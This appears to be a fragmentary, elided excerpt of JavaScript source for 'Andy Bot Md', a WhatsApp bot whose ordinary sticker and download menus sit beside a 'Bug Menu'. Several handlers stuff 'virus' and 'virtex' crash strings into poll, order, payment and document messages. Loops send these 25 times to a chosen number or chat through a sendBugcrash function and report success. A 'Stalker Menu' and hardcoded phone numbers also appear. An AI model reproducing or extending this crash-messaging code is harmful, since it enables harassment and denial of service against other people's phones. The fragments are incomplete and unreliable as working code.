...
if (m.key.remoteJid == 'status@broadcast') return kayla.sendReadReceipt(from, m.sender, [m.key.id])
...
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: '50941411147@s.whatsapp.net' } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
...
"fileName": `Andy Bot Md WhatsApp${ngazap(prefix)}`,
...
"message": {
"pollCreationMessage": {
"name": `Andy Bot Md ${virus}${virtex(prefix)}`,
"options": [
	{
...
"optionName": "KATANYA KEBAL"
	...
	{
"optionName": "SALAM DARI Andy Bot Md"
	}
],
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `Andy Bot Md WhatsApp${ngazap(prefix)}`,
"orderTitle": "Andy Bot Md WhatsApp${ngazap(prefix)}",
"sellerJid": "50941411147@s.whatsapp.net",
...
const botzkayla = "50941411147@s.whatsapp.net"
...
caption: `Yoo bro 🙂 @${sender.split("@")[0]} 
I am Andy a WhatsApp Bot that can help you make stickers, download Tiktok videos/audio, download YouTube videos/audio, make text pro/photooxy/ephoto360 logos, and others 🙂❤️

Name ${itsMeKayla ? 'Owner' : 'User'} : ${pushname}
Number ${itsMeKayla ? 'Owner' : 'User'} : ${sender.split("@")[0]}
Number of users : ${pendaftar.length} User
Status : ${itsMeKayla ? 'Owner' : 'User'}
Status Premium : ${isPrem ? 'Premium User' : 'Free User'}
Runtime Bot : ${runtime(process.uptime())}
Bot Speed : ${latensi.toFixed(4)} 𝘋𝘦𝘵𝘪𝘬
Otw Tahun Baru : ${jhari} 𝐃𝐚𝐲𝐬 ${jjam} 𝐇𝐨𝐮𝐫𝐬 ${jmenit} 𝐌𝐢𝐧𝐮𝐭𝐞𝐬 ${jdetik} 𝐒𝐞𝐜𝐨𝐧𝐝
Otw Idul Fitri : ${hahari} 𝐃𝐚𝐲𝐬 ${hajam} 𝐇𝐨𝐮𝐫𝐬 ${hamenit} 𝐌𝐢𝐧𝐮𝐭𝐞𝐬 ${hadetik} 𝐒𝐞𝐜𝐨𝐧𝐝
Otw Idul Adha : ${hihari} 𝐃𝐚𝐲𝐬 ${hijam} 𝐇𝐨𝐮𝐫𝐬 ${himenit} 𝐌𝐢𝐧𝐮𝐭𝐞𝐬 ${hidetik} 𝐒𝐞𝐜𝐨𝐧𝐝
Creator Birthday: : ${kayhari} 𝐃𝐚𝐲𝐬 ${kayjam} 𝐇𝐨𝐮𝐫𝐬 ${kaymenit} 𝐌𝐢𝐧𝐮𝐭𝐞𝐬 ${kaydetik} 𝐒𝐞𝐜𝐨𝐧𝐝
...
title: `𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗟𝗘𝗖𝗧`,
rows: [
{title: `⊟ 𝗔𝗹𝗹 𝗺𝗲𝗻𝘂`, rowId: `${prefix}allmenu`},
{title: `⊟ 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂`, rowId: `${prefix}ownermenu`},
{title: `⊟ 𝗢𝘁𝗵𝗲𝗿 𝗠𝗲𝗻𝘂`, rowId: `${prefix}othermenu`},
{title: `⊟ 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗠𝗲𝗻𝘂`, rowId: `${prefix}downloadmenu`},
{title: `⊟ 𝗕𝘂𝗴 𝗠𝗲𝗻𝘂`, rowId: `${prefix}bugmenu`},
{title: `⊟ 𝗚𝗿𝗼𝘂𝗽 𝗠𝗲𝗻𝘂`, rowId: `${prefix}groupmenu`},
{title: `⊟ 𝗙𝘂𝗻 𝗠𝗲𝗻𝘂`, rowId: `${prefix}funmenu`},
{title: `⊟ 𝗦𝘁𝗮𝗹𝗸𝗲𝗿 𝗠𝗲𝗻𝘂`, rowId: `${prefix}stalkermenu`},
{title: `⊟ 𝗙𝗼𝘁𝗼 𝗠𝗲𝗻𝘂`, rowId: `${prefix}randfotomenu`},
{title: `⊟ 𝗩𝗶𝗱𝗲𝗼 𝗠𝗲𝗻𝘂`, rowId: `${prefix}randvideomenu`},
{title: `⊟ 𝗧𝗲𝘅𝘁 𝗣𝗿𝗼 𝗠𝗲𝗻𝘂`, rowId: `${prefix}textpromenu`},
{title: `⊟ 𝗣𝗵𝗼𝘁𝗼 𝗢𝘅𝘆 𝗠𝗲𝗻𝘂`, rowId: `${prefix}photooxymenu`},
{title: `⊟ 𝗘𝗽𝗵𝗼𝘁𝗼 𝗠𝗲𝗻𝘂`, rowId: `${prefix}ephoto360menu`},
{title: `⊟ 𝗖𝗲𝗿𝗽𝗲𝗻 𝗠𝗲𝗻𝘂`, rowId: `${prefix}cerpenmenu`},
{title: `⊟ 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 𝗚𝗿𝗼𝘂𝗽`, rowId: `${prefix}groupbot`},
]}]
const listMenuMessage = { 
text: `𝗣𝗹𝗲𝗮𝘀𝗲 𝗯𝗿𝗼 @${sender.split("@")[0]} 𝗣𝗿𝗲𝘀𝘀 𝗧𝗵𝗲 𝗕𝘂𝘁𝘁𝗼𝗻 𝗧𝗼 𝗦𝗲𝗲 𝗕𝗼𝘁 𝗖𝗼𝗺𝗺𝗮𝗻𝗱`,
mentions: [sender],
footer: fake,
buttonText: '❤️ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 🌚',
sections: seactions,
listType: 1}
...
kayla.sendMessage(from, { text : `Yoo bro @${sender.split("@")[0]}, Here, my Creator, don't mess around, Ici c'est mon creator, ne plaisante pas`, mentions: [sender]}, { quoted: repf })
}
break
case 'menu':{
...
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://chat.whatsapp.com/DSjOomRaTkU4z1a5ngl2Yw',
...
owned = '50941411147@s.whatsapp.net'
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
...
kayla.sendMessage(from,{image:qrisdonate, caption:`Yoo bro 🙂 @${sender.split("@")[0]} Mau ${command}?
...
const listSw = { 
text: `Yoo bro 🙂 @${sender.split("@")[0]} ${ucapanWaktu}`,
mentions: [sender],
...
case 'addprem':
if (!itsMeKayla) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 50941411147`)
...
contextInfo:{
"externalAdReply": {
"title": `Andy Bot Md ${virus}${virtex(prefix)}`,
"body": `Andy Bot Md ${virus}${virtex(prefix)}`,
mimetype: 'audio/mpeg', 
caption: `Andy Bot Md WhatsApp${ngazap(prefix)}`,
showAdAttribution: true,
...
Message: { 
extendedTextMessage: { 
text: `Andy Bot Md ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
...
"caption": `Andy Bot Md ${virus}${virtex(prefix)}`,
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(num, `Andy Bot Md ${virus}${virtex(prefix)}`, `Andy Bot Md ${virus}${virtex(prefix)}`, `Andy Bot Md ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
...
"title": `Andy Bot Md WhatsApp ${virus} ${virtex(prefix)}`,
...
"url": `https://wa.me/50941411147`
},
"businessOwnerJid": "50941411147@s.whatsapp.net",
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(m.chat, `Andy Bot Md ${virus}${virtex(prefix)}`, `Andy Bot Md ${virus}${virtex(prefix)}`, `Andy Bot Md ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
...
"name": `Andy Bot Md WhatsApp ${virus}`,
"address": `Created by andy ${virtex(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
...
let e = String(err)
kayla.sendMessage("50941411147@s.whatsapp.net", { text: "Hello Owner It seems there is an error please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 5, 
isForwarded: true
}})
